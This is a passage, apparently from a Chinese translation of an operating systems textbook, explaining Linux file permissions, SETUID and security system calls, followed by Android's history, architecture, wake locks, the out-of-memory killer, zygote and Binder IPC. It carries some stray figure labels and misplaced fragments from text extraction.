Linux 作为MINIX 和UNIX 的复制品，几乎从一开始就是一个多用户系统。
这段历史意味着Linux 从 早期开始就建立了安全和信息访问控制机制。
在接下来的几节里，我们将关注Linux 安全性的一些方面。
10.7.1 基本概念
一个Linux系统的用户群体由一定数量的注册用户组成，其中每个用户拥有一个唯一的UID (用户 ID) 。
UID 是介于0到65535之间的一个整数。
文件(进程及其他资源)都标记了它的所有者的UID。
尽 管可以改变文件所有权，但是默认情况下，文件的所有者是创建该文件的用户。
Linux 中的基本安全机制很简单。
每个进程记录它的所有者的UID 和GID 。
当一个文件被创建时，它 的UID 和GID 被标记为创建它的进程的UID 和GID 。
该文件同时获得由该进程决定的一些权限。
这些权限 指定所有者、所有者所在组的其他用户及其他用户对文件具有什么样的访问权限。
对于这三类用户而言，
潜在的访问权限为读、写和执行，分别由r 、w 和x标记。
当然，执行文件的权限仅当文件是可执行二进 制程序时才有意义。
试图执行一个拥有执行权限的非可执行文件(即，并非由一个合法的文件头开始的 文件)会导致错误。
因为有三类用户，每类用户的权限由3个比特位标记，那么9个比特位就足够标记访 问权限。
图10-37给出了一些9位数字及其含义的例子：
图10-37 文件保护模式的例子
图10-37前两行的意思很清楚，准许所有者以及与所有者同组的人所有权限。
接下来的一行准许所 有者同组用户读权限但是不可以改变其内容，而其他用户没有任何权限。
第四行通常用于所有者想要公 开的数据文件。
类似地，第五行通常用于所有者想要公开的程序。
第六行剥夺了所有用户的任何权利。
这种模式有时用于伪文件来实现相互排斥，因为想要创建一个同名的文件的任何行为都将失败。
如果多 个进程同时想要创建这样一个文件作为锁，那么只有一个能够创建成功。
最后一个例子相当奇怪，因为 它给组以外其他用户更多的权限。
但是，它的存在是符合保护规则的。
幸运的是，尽管没有任何文件访 问权限，但是所有者可以随后改变保护模式。
UID为0的用户是一个特殊用户，称为超级用户(或者根用户)。
超级用户能够读和写系统中的任何 文件，不论这个文件为谁所有，也不论这个文件的保护模式如何。
UID 为0的进程拥有调用一小部分受 保护的系统调用的权限，而普通用户是不能调用这些系统调用的。
一般而言，只有系统管理员知道超级 用户的密码，但是很多学生寻找系统安全漏洞想让自己能够不用密码就可以以超级用户的身份登录，并 且认为这是一种了不起的行为。
管理人员往往对这种行为很不满。
与I/O相关的特殊文件拥有与普通文件一样的保护位。
这种机制可以用来限制对I/O设备的访问权限。
例如，假设打印机是特殊文件，/dev/Ip, 可以被根用户或者一个叫守护进程的特殊用户拥有，具有保护 模式rw------, 从而阻止其他所有人对打印机的访问权限。
毕竟，如果每个人都可以任意使用打印机， 那么就会发生混乱。
当然，让/dev/lp 被守护进程以保护模式rw------ 拥有，意味着其他任何人都不可以使用打印机，尽 管有很多早期死亡的无辜的trees, 但是这种做法限制了很多合法的打印要求。
事实上，允许对I/O 设备 及其他系统资源进行受控访问的做法具有一个更普遍的问题。
许多敏感的Linux 程序通过打开SETUID 位被根用户所有。
例如，允许用户改变密码的程序需要写 password 文件。
允许password 文件公开可写显然不是个好主意。
解决的方法是，提供一个被根用户所有 同 时SETUID 位打开的程序。
虽然该程序拥有对password 文件的全部权限，但是它仅仅改变调用该程序 的用户的密码，而不允许其他任何的访问权限。
除 了SETUID 位，还有一个SETGID 位，工作原理同SETUID 类似。
它暂时性地给用户该程序的有效 GID 。
然而在实践中，这个位很少用到。
10.7.2 Linux中安全相关的系统调用
只有为数不多的几个安全性相关的系统调用。
其中最重要的几个在图10-38中列出。
最常用到的安 全相关的系统调用是chmod 。
它用来改变保护模式。
例如：
s=chmod("/usr/ast/newgame",0755);
它把newgame 文件的保护模式修改为rwxr-Xr-x, 这样任何人都可以运行该程序(0755是一个八进制常数， 这样表示很方便，因为保护位每三个分为一组)。
只有该文件的所有者和超级用户才有权利改变保护模式。
图10-38 一些与安全相关的系统调用。
当错误发生时，返回值s为 - 1 ;uid 和gid 分别是UID 和GID 。
参数 的意思不言自明
access 系统调用检验用实际的UID 和GID 对某文件是否拥有特定的权限。
对于根用户所拥有的并设 置了SETUID 的程序，我们需要这个系统调用来避免安全违例。
这样的程序可以做任何事情，有时需要 这样的程序判断是否允许用户执行某种访问。
让程序通过访问判断显然是不行的，因为这样的访问总能 成功。
使用access 系统调用，程序就能知道用实际的UID 和GID 是否能够以一定的权限访问文件。
接下来的四个系统调用返回实际的和有效的UID 和GID 。
最后的三个只能够被超级用户使用，它们 改变文件的所有者以及进程的UID 和GID。
10.7.3 Linux中的安全实现
到这里，用户选择的shell 已经在运行，并且被设置了正确的UID 和GID, 标准输入、标准输出和标 准错误输出都被设置成了默认值。
它创建任何子进程(也就是用户输入的命令)都将自动继承shell 的 UID 和GID, 所以它们将拥有正确的UID 和GID, 这些进程创建的任何文件也具有这些值。
当任何进程想要打开一个文件，系统首先将文件的i 节点所记录的保护位与用户的有效UID 和有效 GID 对比，来检查访问是否被允许。
如果允许访问，就打开文件并且返回文件描述符；否则不打开文件， 返回-1。
在接下来的read 和write 中不再检查权限。
因此，当一个文件的保护模式在它被打开后修改， 新模式将无法影响已经打开该文件的进程。
Linux 安全模型及其实现在本质上跟其他大多数传统的UNIX 系统相同。
实例研究1: UNIX、Linux和Android 455
10.8 Android
Android 是一种比较新的操作系统，专为运行在移动智能设备上而设计。
它基于Linux 内核 — — Android 只是将少许新的概念引入Linux内核之中，它使用了你已经很熟悉的大多数Linux 设施(进程、 用户ID、文件系统、调度等),但是Android是以与其最初意图非常不一样的方式使用这些设施的。
自问世以来的5年间，Android 已经成长为使用最为广泛的智能手机操作系统之一。
Android 普及的 因为之一是搭上了智能手机爆炸式增长的快车，另一个原因是移动设备制造商可以免费获得Android 并 将其用在自己的设备之中。
Android 还是一种开源平台，这使得它可以定制化，适用于形形色色的设备。
Android 不但在以消费者为中心的设备(例如平板电脑、电视、游戏机以及媒体播放器)上流行，在这 样的设备上，第三方应用生态系统是有益的；而且Android 还越来越多地用作需要图形用户界面 (Graphical User Interface,GUI) 的专用设备的嵌入式oS, 例如VOIP电话、智能手表、汽车仪表盘、医 疗设备以及家用电器。
Android操作系统的大部分是用高级语言编写的，即Java程序设计语言。
内核和大量的低层库是用C 和C++编写的。
不但系统的大部分是用Java 编写的，而且除了少量例外，整个应用程序API也是用Java编 写和发布的。
Android 中用Java编写的部分倾向于遵循完全的面向对象设计，这正是该语言所鼓励的。
10.8.1 Android与Google
Android 是一种异于常规的操作系统，它将开源代码和闭源第三方应用程序结合在一起。
Android 的 开源部分称为Android 开源项目(Android Open Source Project,AOSP),它是完全开放的，任何人都可 以免费使用和修改。
Android 的一个重要目标是支持丰富的第三方应用程序环境，这就要求Android 具有稳定的实现和 API, 从而使应用程序得以在其上运行。
然而，在开源世界中每一个设备厂商都可以随其意愿定制平台， 于是兼容性问题很快就产生了。
这就需要有某种方法来控制这一冲突。
在Android 针对这一问题的解决方案中，有一部分是兼容性定义文档 (Compatibility Definition Document,CDD), 它描述了为了与第三方应用程序相兼容，Android 所必须遵循的行为方式。
这一文 档本身描述了为了成为兼容的Android 设备所必需的条件。
然而，因为缺乏某种方法来强制实施这样的 兼容性，于是它经常被忽略，因此需要某种额外的机制来做这件事。
Google Play使用了两个主要的机制来保证兼容性。
第一个并且是最重要的机制，就是要求通过它得 以上市的任何设备必须按照CDD 的要求具备兼容性。
这就保证了跨设备的行为底线。
此外，Google Play 必须了解应用程序要求设备所具备的任何功能特性(例如为了执行地图导航必须存在GPS), 这样 一来 在缺乏这些功能特性的设备上应用程序就是不可用的。
10.8.2 Android的历史
1.早期发展
Android 有限公司是一家软件公司，创立该公司的目的是为智能移动设备开发软件。
Android 最初的 着眼点是照相机，之后目光很快就切换到智能手机，因为智能手机拥有更大的潜在市场。
这一最初目标 发展的结果是解决了当时在移动设备开发中遇到的难题，方法是引入构建于Linux 之上的一个开放平台，
这样就有可能获得广泛的应用。
在这一时期实现了平台的用户界面原型，以展示隐含在其背后的理念。
平台本身则意在三种重要的 语言——JavaScript 、Java 和C++, 以期支持丰富的应用开发环境。
2006年年初，计划发生了重要的改变：平台不再支持多种程序设计语言，而是将其应用开发完全聚 焦于Java 程序设计语言。
这是一个艰难的改变，因为原来的多语言方法由于拥有“世上最好的一切”而 在表面上使每个人都感到高兴，而聚焦于一种语言对于更喜欢其他语言的工程师来说会觉得是大踏步的 倒退。
然而，试图使每个人都感到高兴很容易造成没有人感到高兴。
构建三组不同语言的API比起聚焦于 单一的语言需要更多的努力，从而大大降低每一种语言API的质量。
聚焦于Java 语言的决策对于平台质 量具有极高的价值，而且使开发团队能够满足重要的截止期限是至关重要的。
大多数早期应用程序开发是在没有多少底层平台实际可供开发者使用的条件下完成的。
平台通常是 全部在一个进程中运行的，也就是说，通过在宿主计算机上作为单一的进程而运行的“模拟器”来运行 全部系统和应用程序。
实际上现如今仍然存在某些这种老式实现的残余，例如在Android 程序员用于编 写应用程序的SDK(Software Development Kit,软件开发工具包)中依然存在Application.onTerminate 方法。
随着软件的日程安排变得日益清晰，两款硬件日程安排中的不合理之处也日益彰显。
到Sooner 有可 能发行之时，硬件或许早就过时了，并且在Sooner 上付出的努力排挤了更为重要的Dream 设备。
为解决 这 一 问题，Android 决定放弃把Sooner 作为目标设备(尽管在该硬件上的开发又持续了一段时间直到准 备好新的硬件),从而把精力全部集中到Dream 上。
2.Android 1.0
Android平台首次可用是2007年11月发行的SDK 预览版。
它包含运行完整Android设备系统映像和核 心应用程序的硬件设备仿真器、API 文档以及开发环境。
此时此刻，核心设计和实现已经准备就绪，并 且在许多方面与我们将要讨论的现代Android 系统体系结构极为相似。
发布会还包括运行在Sooner 和 Dream 硬件之上的平台视频演示。
Android 的早期开发是在一系列按季度演示的里程碑事件之下进行的，这样做是为了推动并展示持 续的进展。
SDK 的发行是平台的首次更为正式的发行。
发行SDK 会要求把到发行时刻为止的各个部分集 成在一起以支持应用程序开发，把平台清理干净，发布平台的文档，并且为第三方开发人员创建统一的 开发环境。
此刻，开发工作将沿着两个轨道发展：吸收关于SDK 的反馈以进一步改进并最终确定API, 以 及 完 成将稳定的Dream 设备推向市场所必需的实现工作。
在这一时期，发生过对SDK 的几次公开更新，这些 更新以2008年8月发行的0.9版告终，这一版包含了几乎是最终的API。
平台本身经历了快速的发展，并且在2008年春季焦点转移到稳定工作之上，从而使Dream 能够推向 市场。
此刻Android 包含了作为商业产品上市从未有过的大量代码，完完全全从C 库的部分到Dalvik 解释 器(由它运行应用程序)、系统以及应用程序。
Android 还包含些许以前从未想到的新颖思想，并且它们如何能够取得成功还尚不清楚。
所有这一 切需要汇集起来成为稳定的产品，开发团队度过了令人寝食不安的几个月，因为他们不知道这一切是否 真的可以汇集在一起并且按预期工作。
最后，在2008年8月，软件稳定下来并且做好了上市的准备。
生产工作进入工厂并且开始烧录到设 备上。
9月，Android 1.0在Dream 设备上发布，那时它的名字是T-Mobile G1。
3.持续开发
最初的兼容性定义文档 (compatibility definition document) 基本上只允许与T-Mobile G1非常相似 的兼容设备。
在接下来的几年，兼容设备的范围得到巨大的扩展。
这一过程的关键时间节点如下。
1)2009年，Android 1.5到2.0版引入了软键盘，取消了对物理键盘的要求；支持范围更为广泛的屏 幕(既包括大小也包括像素密度),包括低端的QVGA 设备和新的大尺寸高清设备，如WVGA Motorola Droid; 并且引入了新的 “system feature”(系统特征)设施，使设备能够报告它们支持什么硬件功能， 应用程序能够指示它们需要哪些硬件功能。
system feature设施是Google Play用来对于特定设备确定其应 用程序兼容性的关键机制。
2)2011年，Android 3.0到4.0版在平台中引入了新的核心支持，以支持10英寸以及更大的平板电 脑；核心平台现在完全支持各种设备屏幕尺寸，从小的QVGA手机到智能手机和大屏“平板手机”,从7 英寸平板电脑和更大的平板电脑到超过10英寸的平板电脑。
3)随着平台对更多各种各样的硬件提供内置的支持，出现了更多类型的Android 设备，不但有更大 的屏幕，而且还有带鼠标或不带鼠标的非触摸设备，其中包括TV设 备 ( 如Google TV)、游戏设备、笔 记本电脑、照相机等。
就Android 1.0而言，重要的工作投入到了获得清晰的第三方应用程序API 和不依赖于拥有专利的 Google 代码的开源平台之中。
然而，Google 专利代码的实现常常还没有清理干净，这样就依赖于平台的 内部成分。
平台时常甚至还不具备Google 专利代码所需要的设施，以便使它们很好地集成在一起。
为解 决这些问题，Google 开展了一系列项目：
1)2009年，Android 2.0版引入了一种体系结构，使第三方能够将他们自己的同步适配器插入平台 API (如通讯录数据库)。
Google 用于同步各种数据的代码迁移到这个定义明确的SDK API。
10.8.3 设计目标
Android 平台的一些关键设计目标在其开发过程中逐步演化：
1)为移动设备提供完全开源的平台。
Android 的开源部分是一个自下而上的操作系统栈，包含各种 应用程序，能够作为完整的产品上市。
2)通过健壮的和稳定的API强有力地支持具有专利的第三方应用。
正如前面所讨论的，维护一个平 台真正开源的同时使具有专利的第三方应用足够稳定是一个挑战。
Android 采用了一种混合技术解决方 案(具体说明定义明确的SDK 并且在公开的API 和内部实现之间进行分隔)和策略必要条件(通过CDD) 来解决这一问题。
4)提供一种应用程序安全性模型，在该模型中用户不必深度信赖第三方应用程序。
操作系统必须保 护用户免受应用程序不端行为的危害，这不但包括可能导致系统崩溃的有缺陷的应用程序，而且还包括 更为微妙的对设备和用户数据的不当使用。
用户越不需要信任应用程序，他们就越拥有自由来尝试和安 装这些应用程序。
5)支持典型的移动用户界面：使用户在许多应用中花费少量的时间。
移动体验趋向于与应用程序进 行短暂的交互：看一眼新收到的电子邮件，接收或者发送一条SMS 信息或者IM, 进入通讯录拨打一个电 话，等等。
系统需要对这些情况进行优化，以期获得快速的应用启动和切换时间。
Android 的目标一般 是用200ms冷启动一个基本的应用程序到显示完整的交互式UI。
7)鼓励应用程序以丰富和安全的方式互操作和协作。
移动应用程序是以某种方式返回到shell 命令的： 它们不是像桌面应用程序那样越来越大的单一设计，而是瞄准并聚焦于特定的需求。
为帮助支持这一点， 操作系统需要为这些应用程序提供新型的设施，使它们共同协作以创建更大的整体。
8)创建一个完全通用的操作系统。
移动设备是通用计算的一种新的表现，而不是对传统桌面操作系 统的简化。
Android 的设计应该足够丰富，从而使它至少能够像传统操作系统一样不断成长。
10.8.4 Android体系结构
Android 建立在标准Linux内核之上，对内核本身只有少量重要的扩展，我们将在后面对此进行讨论。
然而， 一旦进入用户空间，Android 的实现与传统的Linux发行版具有相当大的不同，并且以非常不一样 的方式使用你已经了解的Linux 功能特性。
如同传统的Linux 系统 一 样，Android 的第一个用户空间进程是init, 它是所有其他进程的根。
然而， Android 的init 启动的守护进程是不同的，这些守护进程更多地聚焦于底层细节(管理文件系统和硬件访 问),而不是高层用户设施，例如调度定时任务 (cron jobs) 。
Android还有一层额外的进程，它们运行 Dalvik 的Java 语言环境，负责执行系统中所有以Java 实现的部分。
图10-39显示了Android 的基本进程结构。
首先是init 进程，它产生了一些底层守护进程。
其中一个 守护进程是zygote, 它是高级Java 语言进程的根。
图10-39 Android 进程层次结构
Android 的init 不以传统的方法运行shell, 因为典型的Android 设备没有本地控制台用于shell 访问。
作为替代，系统进程adbd监听请求shell访问的远程连接(例如通过USB), 按要求为它们创建shell进程。
其他进程在需要的时候由zygote创建。
这些进程中有一些是“持久的”进程，它们是基本操作系统 的组成部分，例如phone进程中的电话栈，它必须保持始终运行。
另外的应用程序进程将在系统运行的 过程中按需创建和终止。
应用程序代码
PackageManager
Binder IPC
Binder IPC Binder IPC
"package"
10.8.5 Linux扩 展
就大部分而言，Android 包含一个常备的Linux内核，提供标准的Linux 功能特性。
Android 作为一个 操作系统，其许多令人感兴趣的方面在于这些现有的Linux 功能特性是如何使用的。
然而，也存在若干
对Linux的重要扩展，Android 系统有赖于此。
1.唤醒锁
在传统的计算机系统上，系统可以处于两种电源状态之一：运行并且准备好处理用户输人；或者深 度睡眠，并且如果没有诸如按下电源键一类的外部中断就不能继续执行。
在运行的时候，次要的硬件设 备可以按需要通电或者断电，但是CPU本身以及核心硬件部件必须保持通电状态以处理到来的网络通信 以及其他类似的事件。
进入低能耗睡眠状态是发生得比较少的事情：或者通过用户明确地让系统睡眠， 或者由于比较长的时间间隔没有用户活动，从而系统自身进入睡眠。
从这样的睡眠状态醒来需要来自外 部源的硬件中断，例如按下键盘上的一个按键，在此刻设备将醒来并且点亮屏幕。
移动设备的用户具有不同的期望。
尽管用户可以关闭屏幕，在这样的情况下看起来好像是让设备睡 眠了，但是传统的睡眠状态实际上并不是用户想得到的。
当设备的屏幕关闭之时，设备仍然需要工作： 它需要能够接听电话呼叫，接收并处理到来的聊天消息数据，以及许多其他事情。
对于移动设备，关于打开和关闭设备屏幕的期望同样比传统的计算机具有更高的要求。
移动交互趋 向于在一整天中有许多次短时的突发：你收到一条消息并且打开设备查看，或许还要发送一句回复； 你碰见一个朋友牵着狗在散步，并且打开设备为她拍了一张照片。
在这类典型的移动应用中，恢复设备 直到它能够使用的任何延迟都会对用户体验造成严重的负面影响。
给定了这样的需求，一种解决方案或许仅仅是当设备的屏幕关闭之时不让CPU睡眠，这样它就总是 准备好再次重新打开。
归根到底，内核了解什么时候线程无需工作调度，并且Linux (以及大多数操作 系统)将会自动地让CPU空闲，在这样的情况下使用较低的电能。
然而，空闲的CPU与真正的睡眠是不同的。
例如：
1)在许多芯片组上，空闲状态使用的电能比真正的睡眠状态要多得多。
2)空闲的CPU可以在任何时刻唤醒，只要某些工作赶巧变得可用，即使该工作是不重要的。
3)只是让CPU空闲并不意味着可以关闭其他硬件，而这样的硬件在真正的睡眠中是不需要的。
Android 上的唤醒锁允许系统进入深度睡眠模式，而不必与一个明确的用户活动(例如关闭屏幕)
绑在一起。
具有唤醒锁的系统的默认状态是睡眠状态。
当设备在运行时，为了保持它不回到睡眠，则需 要持有一个唤醒锁。
当屏幕打开时，系统总是持有一个唤醒锁，这样就阻止了设备进入睡眠，所以它将保持运行，正如 我们所期盼的。
然而，在屏幕关闭时，系统本身一般并不持有唤醒锁，所以只有在某些其他实体持有唤醒锁的条件 下才能保持系统不进入睡眠。
当没有唤醒锁被持有时，系统进入睡眠，并且只能由于硬件中断才能将其 从睡眠中唤醒。
一旦系统已经进入睡眠，硬件中断可以将其再次唤醒，如同在传统操作系统中那样。
这样的中断源 有基于时间的警报、来自蜂窝无线电的事件(例如呼入的呼叫)、到来的网络通信以及按下特定的硬件 按钮(例如电源按钮)。
针对这些事件的中断处理程序要求对标准Linux 做出一个改变：在处理完中断之 后，它们需要获得一个初始的唤醒锁从而使系统保持运行。
中断处理程序获得的唤醒锁必须持有足够长的时间，以便能够沿着栈向上将控制传递给内核中的驱 动程序，由其继续对事件进行处理。
然后，内核驱动程序负责获得自己的唤醒锁，在此之后，中断唤醒 锁可以安全地得到释放而不存在系统进入睡眠的风险。
如果在这之后驱动程序将该事件向上传送到用户空间，则需要类似的握手。
驱动程序必须确保继续 持有唤醒锁直到它将事件传递给等待的用户进程，并且要确保存在使用户进程获得自己的唤醒锁的条件。
这一流程可能还会在用户空间的子系统之间继续，只要某个实体持有唤醒锁，我们就继续执行想要的处 理以便响应事件。
然而，一旦没有唤醒锁被持有，整个系统将返回睡眠并且所有进程停止。
2.内存不足杀手
Linux中的“内存不足杀手”(out-of-memory Killer) 试图在内存极低时进行恢复。
在现代操作系统 上内存不足的情况是模糊的事情。
由于有分页和交换，应用程序本身很难看到内存不足的错误。
然而，
内核仍然可能进入这样一种情形，当需要的时候找不到可用的RAM 页面，不但对新的分配会这样，而 且在换入或者分页入某些正在使用的地址范围时也可能如此。
在这样的低内存情形中，标准的Linux内存不足杀手是最后的应急手段，它试图找到RAM, 使 得 内 核能够继续处理它正在做的事情。
做法是为每个进程分配一个“坏度”(badness) 水平，并且简单地杀 死最坏的进程。
进程的坏度基于进程正在使用的RAM数量、它已经运行了多长时间以及其他因素，目 标是杀死大量但愿不太重要的进程。
考虑到这样的情形，常备的Linux内存不足杀手工作得不太好，因为它更多地被预定为最后的应急 手段，并且很难正确地识别合理的进程来杀死。
事实上，正如我们在后面要讨论的， Android 广泛地依 赖定期运行内存不足杀手以收割 (reap) 进程，并且对于选择哪个进程的问题做出好的选择。
与试图猜测哪个进程应该被杀死不同，Android 的内存不足杀手非常严格地依赖由用户空间提供给 它的信息。
传统的Linux内存不足杀手具有每个进程的oom_adj 参数，通过修改进程的总体坏度得分，该 参数可用来指导选择最佳的进程并将其杀死。
Android 的内存不足杀手使用这个相同的参数，但是具有 严格的顺序：具有较高oom_adj的进程总是在那些具有较低oom_adj 的进程之前被杀死。
我们将在后面讨 论Android系统如何分配这样的得分。
10.8.6 Dalvik
Dalvik 在Android 上实现了Java 语言环境，它负责运行应用程序以及大部分系统代码。
system_ service 进程中的几乎一切——从包管理器 (package manager),到窗口管理器 (window manager),再 到 活动管理器 (activity manager)——都是由Dalvik执行的Java 语言代码实现的。
特别值得注意的是Android 对于进程的使用。
Android 的设计并不依赖Java 语言将应用程序与系统相 隔离，相反，它采取传统的操作系统方法进行进程隔离。
这意味着，每个应用程序运行在自己的Linux 进程中，具有自己的Dalvik环 境 ，system_server 和平台的其他核心部分就是用Java 编写的。
使用进程进行这样的隔离使得Android能够借力于Linux的功能特性来管理进程，从内存隔离到当进 程结束时清除与进程相关的所有资源，都是如此。
除了进程以外，Android 还排他地依赖于Linux的安全
特性，而不是使用Java的SecurityManager体系结构。
Linux 进程和安全的应用大大简化了Dalvik 环境，因为它不再需要负责系统稳定性和健壮性这些关 键的方面。
并非偶然地，它还允许应用程序在它们的实现中自由地使用本机代码，这对于游戏特别重要， 因为游戏通常建立在基于C++ 的引擎之上。
像这般混合进程和Java 语言确实引入了某些挑战。
即便在现代移动硬件之上，也需要花费一秒钟启 动全新的Java 语言环境。
请记住Android 的设计目标之一，是能够以200ms 为目标快速启动应用程序。
要 求为新的应用程序启动全新的Dalvik 进程将会大大超出预算。
就算是不需要初始化一个新的Java 语言环 境，200ms 启动在移动硬件上也很难达到。
这一问题的答案是我们在前面简要提及的zygote 本机守护进程。
zygote 负责启动并初始化Dalvik 到 一个阶段，在此处已做好准备开始运行用Java 写的系统或应用程序代码。
所有基于Dalvik 的新进程(系 统或应用程序)都是从zygote 创建的，使得它们能够在环境已经准备就绪的条件下开始执行。
由zygote 启动的不仅仅是Dalvik 。
zygote 还预装载了Android 框架的许多部分，这些部分对于系统和 应用程序而言是公共的，并且zygote 还装载了经常需要使用的资源和其他东西。
注意，从zygote 创建新进程涉及Linux 的fork, 但是不存在exec 调用。
新进程是最初zygote 进程的复 制品，拥有已经建立好的所有预初始化状态，并且做好了运行的准备。
图10-41显示了新的Java 应用程序 进程是如何与最初的zygote 进程相联系的。
调用fork 之后，新进程有了自己单独的Dalvik 环境，只是它与 zygote 通过写时复制页面共享预装载和初始化的数据。
现在，让新的可运行进程准备就绪所剩下的所有 事情是给它一个正确的标识(UID 等),完成Dalvik 启动线程所需要的初始化工作，以及装载要运行的应 用程序或系统代码。
zygote App进程
应用程序类与资源
预装载的资源
预装载的类
Dalvik
图10-41 从zygote创建新的Dalvik进程
除了启动速度，zygote 还带来了另外一个好处。
因为只使用fork 从zygote 创建进程，所以初始化 Dalvik 并且预装载类和资源所需要的大量脏RAM页面可以在zygote 与它的所有子进程之间共享。
这样的共 享对于Android 环境尤其重要，因为交换是不可用的，而从“磁盘”(闪存)按需分页干净的页面(例如可 执行代码)是可用的。
然而，任何脏页面必须在RAM中保持锁定，它们不能分页换出到“磁盘”上。
10.8.7 Binder IPC
Android 的系统设计特别围绕进程隔离，不但在应用程序之间，而且在系统本身的不同部分之间隔 离进程。
这就要求进行大量的进程间通信，从而在不同的进程之间实现协同，这需要做大量的工作并得 到正确的结果。
Android 的Binder 进程间通信机制是一个丰富的通用IPC 设 施 ，Android 系统的大部分就建 立在该设施之上。
Binder 体系结构分为三个层次，如图10-42所示。
在栈的最底层是一个内核模块，实现了实际的跨
进程交互，并且通过内核的ioctl函数将其展露 (ioctl 核驱动程序和模块。
)在内核模块之上，是一个
基本的面向对象的用户空间API, 允许应用程序 通过IBinder 和Binder 类创建并且与IPC端点进行 交互。
在顶部是一个基于接口的编程模型，应 用程序在其中声明它们的IPC接口，并且不再需 要关心IPC在底层是如何发生的细节问题。
1.Binder 内核模块
Binder 没有使用像管道这样的现有Linux IPC 设施，它包含一个特别的内核模块来实现其 自己的IPC制 。
Binder IPC模型与传统的Linux 机 制差别之大，使得它无法纯粹在用户空间及 Linux 机制之上来实现。
此外，Android 不支持大 部分System V原语(信号量、共享内存段、消 息队列)进行跨进程的交互，因为它们不能提 供健壮的语义以清除来自有问题的或恶意的应 用程序的资源。
Binder 使用的基本IPC模型是远程过程调用 (Remote Procedure Call,RPC)。
也就是说，发 送的进程向内核提交一个完整的IPC操作，该操 作在接收的进程中被执行；当接收者执行时， 发送者可能会阻塞，使结果得以从调用中返回。
是一个通用的内核调用，用来发送定制的命令给内
平台/应用程序
方法调用
接口/aidl
接口定义
transact() onTransact()
IBinder/Binder
Binder用户空间
命令代码 结果代码
ioctl()
Binder内核模块
图10-42 Binder IPC体系结构
(发送者可以有选择地设定它们不阻塞，从而继续执行，与接收者并行。
)因此，Binder IPC是基于消息 的，类似System V消息队列，而不是基于流的(如Linux管道)。
Binder 中的消息称为事务 (transaction), 在更高层可以被看作跨进程的函数调用。
用户空间提交给内核的每个事务是一个完整的操作：它标识操作的目标和发送者的标识符，以及交 付的完整数据。
内核决定适当的进程来接收该事务，将其交付给进程中等待的线程。
进程1 进程2
事务
Ta
送到：对象1
(数据)
线程池
T1 T2
内核
事务
送到：对象1
来自：进程1
(数据)
事务
送到：对象1
来自：进程1
(数据)
线程池
T1 T2
图10-43 基本的Binder IPC事务
(为方便此处的讨论，我们利用两个副本简化了事务数据通过系统进行迁移的方式， 一个副本送到 内核中，一个副本送到接收进程的地址空间中。
实际的实现是以一个副本来做这件事的。
对于可以接收 事务的每一个进程而言，内核为它创建一个共享内存区。
当处理一个事务时，内核首先确定将要接收事 务的进程，并且直接将数据复制到共享地址空间中。
)
注意图10-43中的每个进程拥有一个“线程池”。
线程池是由用户空间创建的一个或多个线程，用以 处理到来的事务。
内核将每个到来的事务分派给进程的线程池中当前正在等待工作的线程。
然而，从发 送进程发出的对内核的调用不必来自线程池——该进程中的任何线程都可以自由地发起一个事务，例如 图10-43中的Ta。
我们已经看到送给内核的事务标识了一个目标对象 (object), 然而，内核必须确定接收进程 (process) 。
为实现这一点，内核跟踪每个进程中可用的对象，并将它们映射到其他进程，如图10-44所 示。
我们在这里看到的对象只是该进程地址空间中的地址。
内核只是跟踪这些对象地址，并没有附着在 它们之上的意义；它们可以是C 数据结构的地址、C++ 对象，或者位于该进程地址空间中的任何其他东西。
进程1
对象la
对象1b
句柄2
内核 进程2
图10-44 Binder 跨进程对象映射
远程进程中对于对象的引用由一个整数句柄 (handle) 来标识，这很像是Linux 的文件描述符。
例 如，考虑进程2中的对象2a——内核知道它与进程2相关联，并且内核进一步在进程1中为它分配句柄2。
因此，进程1可以提交一个事务给内核，目标为它的句柄2,从中内核能够确定这是发给进程2的，并且 特别是该进程中的对象2a。
与文件描述符相似的还有， 一个进程中句柄的值与其他进程中的值相同并不意味着相同的事物。
例 如，在图10-44中，我们可以看到在进程1中，句柄值2标识对象a; 然而在进程2中，相同的句柄值2标识 对象1a 。
此外，如果内核没有分配句柄给某个进程，那么其他进程将无法访问该进程中的对象。
同样在 图10-44中，我们可以看到内核知道进程2的对象2b, 但是对于进程1没有为它分配句柄。
因此，对于进 程1而言，不存在访问该对象的路径，即便内核已经对于其他进程为它分配了句柄。
然而，从一开始这些句柄到对象的关联是如何得以建立的?
与Linux 文件描述符不同，用户空间并 不直接请求句柄。
相反，内核按需分配句柄给进程。
这一过程显示在图10-45中。
这里我们讨论的是前 一张图中从进程2到进程1引用对象1b是如何发生的。
关键在于在图的底部从左到右事务是如何流经系统 的。
图10-45所示的关键步骤是：
1)进程1创建一个初始的事务结构，其中包含对象1b的本地地址。
2)进程1提交事务到内核。
3)内核查看事务中的数据，找到地址对象1b, 并且创建一个针对它的新条目，因为它以前并不知 道该地址。
4)内核利用事务的目标句柄2来确定它意在进程2中的对象2a。
5)内核现在将事务头重写，使其适合进程2,改变其目标为地址对象2a。
6)内核同样为目标进程重写事务数据；此处它发现对象1b 还不被进程2所知，所以为它创建一个新
7)重写的事务被交付给进程2来执行。
进程1 内核 进程2
图10-45 在进程之间传输Binder 对象
如果事务内部的一个对象已经由接收进程知晓，则流程是类似的，差别在于现在内核只需要重写事 务，使得事务包含此前已分配的句柄或者接收进程的本地对象指针。
这意味着，发送相同的对象到一个 进程很多次，总是会得到相同的标识，这与Linux 文件描述符不同，在Linux 中打开相同的文件多次，每 次会分配不同的文件描述符。
当对象在进程之间传递时，Binder IPC系统将维护唯一的对象标识。
Binder 体系结构本质上为Linux 引入了一个基于能力的安全模型。
每一个Binder 对象是一个能力。
发 送一个对象到另一个进程就是将能力授予该进程。
于是，接收进程可以使用对象提供的一切功能。
进程 可以送出一个对象到另一个进程，然后从任何进程接收一个对象，并且识别接收到的对象是否正是它最 初送出的那个对象。
2.Binder 用户空间API
1) IBinder 是Binder 对象的抽象接口。
其关键方法是transact, 它将一个事务提交给对象。
接收事务 的实现可能是本地进程中的一个对象，或者是另一个进程中的对象；如果它在另一个进程中，则将会通 过如前面讨论的Binder内核模块交付给它。
2) Binder 是一个具体的Binder 对象。
实现一个Binder 子类将给你一个可以从其他进程调用的类。
其 关键方法是onTransact, 它接收发送给它的一个事务。
Binder 子类的主要责任是查看它接收的事务数据， 并且执行适当的操作。
图10-46描述了这些类是如何一同工作的，这幅图以用到的用户空间类修改了我们在前面看过的 图10-44。
在此处我们看到Binder1b 和Binder2a 是具体Binder 子类的实例。
为了执行一个IPC, 进程现在 要创建一个包含期望数据的Parcel,并且通过我们还没有见过的类BinderProxy 将其发送。
